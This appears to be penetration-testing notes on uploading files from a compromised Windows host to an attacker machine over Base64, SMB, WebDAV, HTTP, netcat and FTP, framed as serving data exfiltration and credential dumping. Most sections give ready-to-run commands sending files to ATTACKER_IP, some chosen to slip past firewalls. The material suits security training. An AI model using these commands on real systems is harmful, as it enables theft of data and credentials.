Uploads are required for:

- Data exfiltration
    
- Credential dumping
    
- Log and configuration analysis
    
- Cracking and offline processing
    

---

## Base64 Upload (Windows → Linux)

This is the reverse of the Base64 download technique.

### Encode File on Windows

```powershell
[Convert]::ToBase64String((Get-Content C:\path\file -Encoding Byte))
```

### Decode on Linux

```bash
echo <BASE64> | base64 -d > file
md5sum file
```

This method is reliable when network uploads are restricted.



---

## SMB Uploads 

An SMB share can be created on the attacker machine and remotely upload the file from Windows.

### SMB Server Setup

```bash
sudo impacket-smbserver share ./smbshare -smb2support
```

### Upload from Windows

```cmd
copy file.zip \\ATTACKER_IP\share\
```



---

## SMB Uploads via WebDAV (SMB over HTTP)

WebDAV allows file transfers over HTTP when SMB is blocked.

### WebDAV Server Setup

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

### Upload from Windows

```cmd
copy file.zip \\ATTACKER_IP\DavWWWRoot\
```

WebDAV uses HTTP, which is more likely to be allowed through firewalls.


---

## PowerShell Web Uploads

PowerShell lacks a native upload cmdlet, but uploads can be implemented using HTTP POST requests.

### Python Upload Server

```bash
pip3 install uploadserver
python3 -m uploadserver
```

This creates an HTTP server with a `/upload` endpoint.

### Upload via PSUpload.ps1

```powershell
Invoke-FileUpload -Uri http://ATTACKER_IP:8000/upload -File C:\path\file
```

This method is clean and suitable for medium-sized files.

---

## Base64 Upload via HTTP + Netcat

Used when no upload endpoint exists.

### Send Base64 Data (Windows)

```powershell
Invoke-WebRequest -Method POST -Body $b64 -Uri http://ATTACKER_IP:8000
```

### Receive and Decode (Linux)

```bash
nc -lvnp 8000
echo <BASE64> | base64 -d > file
```

This is simple but noisy and manual.


---

## FTP Uploads

FTP uploads are useful when FTP outbound traffic is allowed.

### Start FTP Server with Upload Permissions

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

### Upload via PowerShell

```powershell
(New-Object Net.WebClient).UploadFile(
'ftp://ATTACKER_IP/uploaded_file',
'C:\path\file'
)
```

### Upload via FTP Script

```cmd
ftp -v -n -s:ftp.txt
```

This enables file uploads even without an interactive shell.
